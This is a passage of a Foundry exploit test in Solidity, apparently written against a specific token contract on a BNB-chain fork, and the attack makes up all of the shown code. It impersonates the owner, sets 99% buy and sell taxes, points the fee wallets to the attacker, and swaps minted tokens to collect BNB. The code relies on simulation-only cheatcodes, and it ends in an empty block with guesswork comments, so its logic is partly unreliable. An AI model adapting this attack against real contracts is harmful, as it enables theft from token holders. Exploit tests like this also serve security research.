    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = TokenTool(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "Victim Token");

        // We'll need the router address from the token contract
        IUniswapV2Router02 router = TokenTool(TARGET).uniswapV2Router();
        address weth = router.WETH();
        address pair = TokenTool(TARGET).uniswapPair();

        vm.label(address(router), "Pancake Router");
        vm.label(pair, "Token-WETH Pair");

        // Give attacker some initial ETH for gas and potential swaps
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address
        address owner = TokenTool(TARGET).owner();

        // Step 2: Impersonate owner and set high taxes
        vm.startPrank(owner);
        TokenTool(TARGET).setBuyTaxes(33, 33, 33); // 99% total buy tax
        TokenTool(TARGET).setSelTaxes(33, 33, 33); // 99% total sell tax

        // Step 3: Set marketing and team wallets to attacker address
        TokenTool(TARGET).setMarketingWalletAddress(attacker);
        TokenTool(TARGET).setTeamWalletAddress(attacker);
        vm.stopPrank();

        // Step 4: Give attacker tokens directly using deal()
        // We need to know the token decimals - let's get some tokens
        // Using deal() to manipulate token balance directly
        uint256 tokenAmount = 1000 * 10**18; // Assuming 18 decimals like most BSC tokens
        deal(TARGET, attacker, tokenAmount);

        // Step 5: Approve router to spend attacker's tokens
        uint256 attackerTokenBalance = TokenTool(TARGET).balanceOf(attacker);
        vm.prank(attacker);
        TokenTool(TARGET).approve(address(TokenTool(TARGET).uniswapV2Router()), attackerTokenBalance);

        // Step 6: Record attacker's initial BNB balance
        uint256 initialBalance = attacker.balance;

        // Step 7: Perform a swap to trigger fee collection
        // We'll swap all tokens for ETH
        uint256 amountToSwap = attackerTokenBalance;

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = TokenTool(TARGET).uniswapV2Router().WETH();

        vm.prank(attacker);
        TokenTool(TARGET).uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0, // accept any amount of ETH
            path,
            attacker, // This is the recipient of the swap output (remaining 1% after 99% fee)
            block.timestamp
        );

        // Step 8: Check if attacker received BNB from fees
        uint256 finalBalance = attacker.balance;

        // Note: With 99% fees, only 1% of the token value goes to the swap output
        // The 99% fee is collected by the contract, swapped to BNB, and sent to marketing/team wallets (attacker)
        // So attacker gets BNB both from the swap output (1%) and from fee distribution (99%)

        // Additional step: Trigger swapAndLiquify if needed
        // The contract might need to accumulate enough tokens before swapping
        // Let's check contract token balance and trigger manually if needed
        uint256 contractBalance = TokenTool(TARGET).balanceOf(TARGET);
        if (contractBalance > 0) {
            // The contract should automatically swap when conditions are met
            // Or we could trigger by sending more tokens through the pair
        }
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

